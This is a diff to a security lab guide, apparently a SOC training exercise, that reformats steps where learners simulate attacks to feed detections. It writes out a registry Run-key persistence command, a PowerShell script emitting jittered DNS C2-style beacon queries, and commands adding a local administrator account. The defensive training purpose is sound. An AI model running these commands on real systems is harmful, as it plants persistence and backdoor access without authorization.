@@ -21,78 +21,73 @@ In this task, you will perform attacks on a host with Microsoft Defender for End
 
 1. In the Command Prompt, create a Temp folder in the root directory. Remember to press Enter after the last row:
 
-```Command Prompt
-cd \
-mkdir temp
-cd temp
-```
+    ```Command Prompt
+    cd \
+    mkdir temp
+    cd temp
+    ```
 
 #### Attack 1 - Persistence with Registry Key Add
 
 1. Copy and run this command to simulate program persistence:
 
-```Command Prompt
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
-```
+    ```Command Prompt
+    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
+    ```
 
 #### Attack 3 - DNS / C2 
 
 1. Copy and run this command to create a script that will simulate a DNS query to a C2 server:
 
-```Command
-notepad c2.ps1
-```
+    ```Command
+    notepad c2.ps1
+    ```
 
 1. Select **Yes** to create a new file and copy the following PowerShell script into *c2.ps1*.
 
     >**Note:** Paste into the virtual machine might have a limited length. Make sure the script looks as it does in these instructions within the *c2.ps1* file.
 
-```PowerShell
-param(
-    [string]$Domain = "microsoft.com",
-    [string]$Subdomain = "subdomain",
-    [string]$Sub2domain = "sub2domain",
-    [string]$Sub3domain = "sub3domain",
-    [string]$QueryType = "TXT",
+    ```PowerShell
+    param(
+        [string]$Domain = "microsoft.com",
+        [string]$Subdomain = "subdomain",
+        [string]$Sub2domain = "sub2domain",
+        [string]$Sub3domain = "sub3domain",
+        [string]$QueryType = "TXT",
         [int]$C2Interval = 8,
         [int]$C2Jitter = 20,
         [int]$RunTime = 240
-)
-
-$RunStart = Get-Date
-$RunEnd = $RunStart.addminutes($RunTime)
-
-$x2 = 1
-$x3 = 1 
-Do {
-    $TimeNow = Get-Date
-    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
-
-    if ($x2 -eq 3 )
-    {
-        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
-         $x2 = 1
+    )
+    $RunStart = Get-Date
+    $RunEnd = $RunStart.addminutes($RunTime)
+    $x2 = 1
+    $x3 = 1 
+    Do {
+        $TimeNow = Get-Date
+        Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        if ($x2 -eq 3 )
+        {
+            Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+            $x2 = 1
+        }
+        else
+        {
+            $x2 = $x2 + 1
+        }    
+        if ($x3 -eq 7 )
+        {
+            Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+            $x3 = 1
+        }
+        else
+        {
+            $x3 = $x3 + 1
+        }
+        $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
+        Start-Sleep -Seconds $Jitter
     }
-    else
-    {
-        $x2 = $x2 + 1
-    }
-    
-    if ($x3 -eq 7 )
-    {
-        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
-        $x3 = 1
-    }
-    else
-    {
-        $x3 = $x3 + 1
-    }
-
-    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
-    Start-Sleep -Seconds $Jitter
-}
-Until ($TimeNow -ge $RunEnd)
-```
+    Until ($TimeNow -ge $RunEnd)
+    ```
 
 1. In the Notepad menu, select **File** and then **Save**. 
 
@@ -100,9 +95,9 @@ Until ($TimeNow -ge $RunEnd)
 
     >**Note:** A new PowerShell window will open and you will see resolve errors. This is expected.
 
-```Command Prompt
-Start PowerShell.exe c2.ps1
-```
+    ```Command Prompt
+    Start PowerShell.exe c2.ps1
+    ```
 
 >**Important:** Do not close these windows. Let this PowerShell script run in the background. The command needs to generate log entries for some hours. You can proceed to the next task and next exercises while this script runs. The data created by this task will be used in the Threat Hunting lab later. This process will not create substantial amounts of data or processing.
 
@@ -119,19 +114,19 @@ In this task, you will perform attacks on a host with the Security Events connec
 
 1. In the Command Prompt, create a Temp folder in the root directory. Remember to press Enter after the last row:
 
-```Command Prompt
-cd \
-mkdir temp
-cd \temp
-```
+    ```Command Prompt
+    cd \
+    mkdir temp
+    cd \temp
+    ```
 
 #### Attack 1 - Persistence with Registry Key Add
 
 1. Copy and run this command to simulate program persistence:
 
-```Command Prompt
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
-```
+    ```Command Prompt
+    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
+    ```
 
 >**Note:** We are using the same *persistence* tactic just like in WIN1, but we will use a different detection in the next exercise.
 
@@ -139,10 +134,10 @@ REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t RE
 
 1. Copy and run this command to simulate the creation of an Admin account. Remember to press Enter after the last row:
 
-```Command Prompt
-net user theusernametoadd /add
-net user theusernametoadd ThePassword1!
-net localgroup administrators theusernametoadd /add
-```
+    ```Command Prompt
+    net user theusernametoadd /add
+    net user theusernametoadd ThePassword1!
+    net localgroup administrators theusernametoadd /add
+    ```
 
 ## Proceed to Exercise 6
